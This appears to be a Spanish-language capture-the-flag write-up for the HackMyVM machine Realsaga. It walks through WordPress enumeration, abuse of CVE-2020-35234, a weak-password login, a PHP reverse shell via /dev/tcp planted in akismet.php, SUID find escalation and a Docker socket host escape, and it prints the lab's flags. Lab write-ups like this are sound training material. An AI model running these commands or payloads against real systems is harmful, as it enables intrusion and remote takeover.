# Realsaga - HackMyVM

## Índice

- [Info](#info)
- [Reconocimiento](#reconocimiento)
  - [Escaneo de red](#escaneo-de-red)
  - [Escaneo de puertos](#escaneo-de-puertos)
- [Enumeración](#enumeración)
  - [WordPress Discovery](#wordpress-discovery)
  - [Plugin vulnerable identificado](#plugin-vulnerable-identificado)
  - [CVE-2020-35234: easy-wp-smtp debug log](#cve-2020-35234-easy-wp-smtp-debug-log)
  - [Login alternativo encontrado](#login-alternativo-encontrado)
- [Explotación](#explotación)
  - [Obtención de Shell vía Plugin Akismet](#obtención-de-shell-vía-plugin-akismet)
  - [Listener y Trigger](#listener-y-trigger)
- [Escalada de Privilegios](#escalada-de-privilegios)
  - [Enumeración post-explotación](#enumeración-post-explotación)
  - [Búsqueda de binarios SUID](#búsqueda-de-binarios-suid)
  - [Explotación de find SUID](#explotación-de-find-suid)
  - [Docker Escape → Root en HOST](#docker-escape--root-en-host)
- [Resumen del Ataque](#resumen-del-ataque)
- [Lecciones Aprendidas](#lecciones-aprendidas)
- [Comandos de Referencia](#comandos-de-referencia)

---

## Info

| Campo       | Detalle                          |
|-------------|----------------------------------|
| Máquina     | Realsaga                         |
| Plataforma  | HackMyVM                         |
| Dificultad  | Easy/Medium                      |
| OS          | Linux (Ubuntu 18.04 + Docker)    |
| IP          | 192.168.0.30                     |
| Puerto clave| 80/tcp (WordPress)               |

---

## Reconocimiento

### Escaneo de red

```bash
sudo arp-scan -l
# 192.168.0.30 → 08:00:27:2F:AF:9D (VirtualBox) ✅
```

### Escaneo de puertos

```bash
nmap -sV -sC -p- 192.168.0.30
```

**Puertos abiertos:**

```
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

> [!NOTE]
> Nmap muestra: `http-title: Did not follow redirect to http://saga.local/`
> Necesario añadir el dominio al `/etc/hosts`.

```bash
echo "192.168.0.30 saga.local" | sudo tee -a /etc/hosts
curl -I http://saga.local  # HTTP/1.1 200 OK ✅
```

---

## Enumeración

### WordPress Discovery

```bash
nmap --script vuln 192.168.0.30
```

**Hallazgos:**

```
| http-enum:
|   /backup/: Backup folder w/ directory listing
|   /wp-login.php: Wordpress login page
| http-wordpress-users:
|   Username found: wpadmin
|   Username found: userd4ve
```

### Plugin vulnerable identificado

```bash
curl http://saga.local/wp-content/plugins/
# → easy-wp-smtp/ detectado (CVE-2020-35234)
```

### CVE-2020-35234: easy-wp-smtp debug log

El plugin expone logs de reset de contraseña en archivos públicos:

```bash
# Solicitar reset para wpadmin
curl -X POST http://saga.local/wp-login.php \
  -d "action=lostpassword" -d "user_login=wpadmin"

# Leer log expuesto
curl http://saga.local/wp-content/plugins/easy-wp-smtp/60cafc19ba1c5_debug_log.txt
```

**Contenido del log:**

```
CLIENT -> SERVER: To reset your password, visit:
http://saga.local/wp-login.php?action=rp&key=Sct2XKYn9lp17YxeMGCX&login=wpadmin
```

> [!WARNING]
> Los intentos de reset vía `curl` fallan por nonces CSRF de WordPress 6.x.
> **Solución:** Fuerza bruta con credenciales débiles.

### Login alternativo encontrado

```bash
# Probando userd4ve con contraseña común
curl http://saga.local/wp-login.php \
  -d "log=userd4ve" -d "pwd=changeme" -c cookies.txt -v
# → 302 Found + cookie wordpress_logged_in_* ✅
```

**Credenciales válidas:** `userd4ve:changeme`

---

## Explotación

### Obtención de Shell vía Plugin Akismet

1. Login al panel WordPress con `userd4ve:changeme`
2. Navegar: **Plugins → Editor → Akismet Anti-Spam** (`akismet.php`)
3. Reemplazar contenido con reverse shell:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.23/4444 0>&1'"); ?>
```

4. Guardar cambios ("Actualizar archivo")

### Listener y Trigger

```bash
# Terminal 1: Escuchar conexión
nc -lvnp 4444

# Terminal 2: Activar shell
curl -s "http://saga.local/wp-content/plugins/akismet/akismet.php"
```

**Resultado:**

```
connect to [192.168.0.23] from saga.local [192.168.0.30]
www-data@saga:/var/www/html/wp-content/plugins/akismet$
```

> ✅ Shell obtenida como `www-data` en contenedor Docker

---

## Escalada de Privilegios

### Enumeración post-explotación

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

ls -la /home/
# /home/dev/ → contiene user.txt

cat /home/dev/user.txt
# 👤 USER FLAG: ad7338854b85303c222cbbf3d4290353 ✅
```

### Búsqueda de binarios SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Hallazgo crítico:**

```
/usr/bin/find  -rwsr-xr-x 1 root root 238080
```

`find` tiene el bit SUID activado → escalada a root posible.

### Explotación de find SUID

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
id
# uid=33(www-data) gid=33(www-data) euid=0(root) ✅
```

> Privilegios efectivos de root en el contenedor.

### Docker Escape → Root en HOST

```bash
# Descubrir socket Docker no estándar
find / -name "docker*" 2>/dev/null
# → /run/docker.saga (¡no .sock!)

# Escape usando socket como root
docker -H unix:///run/docker.saga run --rm -v /:/host alpine:latest cat /host/root/root.txt
```

**Resultado:**

```
4aa171ec191d90249c0f7d28d8f589cc
```

> 🔐 **ROOT FLAG CAPTURADA** ✅

---

## Resumen del Ataque

```
arp-scan → host 192.168.0.30
    │
nmap -p- → puertos 25, 80 + redirect saga.local
    │
/etc/hosts + WordPress enum → usuarios: wpadmin, userd4ve
    │
CVE-2020-35234 (easy-wp-smtp) → reset password expuesto
    │
Login alternativo: userd4ve:changeme → Panel WordPress
    │
Editar akismet.php → Reverse shell → www-data
    │
find / -perm -4000 → /usr/bin/find SUID
    │
find . -exec /bin/bash -p \; -quit → euid=0(root)
    │
docker -H unix:///run/docker.saga → HOST root
    │
[🏁] Flags: user.txt + root.txt
```

---

## Lecciones Aprendidas

1. **Dominios personalizados:** Si Nmap muestra redirección a nombre de host, añadir siempre a `/etc/hosts`.
2. **CVE-2020-35234 es oro en CTFs:** Plugins con logs de debug expuestos permiten reset de contraseñas sin autenticación.
3. **Nonces de WordPress:** Los formularios protegidos por CSRF a veces requieren navegador; no todo es automatizable con `curl`.
4. **SUID en binarios comunes:** `find`, `bash`, `python` con `-rwsr-xr-x` = escalada inmediata con `-p`.
5. **Docker sockets no estándar:** Buscar `/run/docker.*` además de `/var/run/docker.sock`; pueden permitir escape directo.
6. **Persistencia en enumeración:** Cuando un vector falla (nonces, permisos), probar alternativas (credenciales débiles, otros plugins).

---

## Comandos de Referencia

```bash
# Recon
sudo arp-scan -l
nmap -sV -sC -p- 192.168.0.30
echo "192.168.0.30 saga.local" | sudo tee -a /etc/hosts

# Enum WordPress
curl http://saga.local/wp-content/plugins/
nmap --script http-wordpress-users 192.168.0.30

# Exploit CVE-2020-35234
curl -X POST http://saga.local/wp-login.php -d "action=lostpassword" -d "user_login=wpadmin"
curl http://saga.local/wp-content/plugins/easy-wp-smtp/*_debug_log.txt

# Shell
nc -lvnp 4444
curl http://saga.local/wp-content/plugins/akismet/akismet.php

# Privesc
find / -perm -4000 -type f 2>/dev/null
/usr/bin/find . -exec /bin/bash -p \; -quit

# Docker Escape
docker -H unix:///run/docker.saga run --rm -v /:/host alpine:latest cat /host/root/root.txt

# Flags
cat /home/dev/user.txt      # User: ad7338854b85303c222cbbf3d4290353
cat /host/root/root.txt     # Root: 4aa171ec191d90249c0f7d28d8f589cc
```

---

> Máquina completada | Abril 2026 | @ladybaba2000
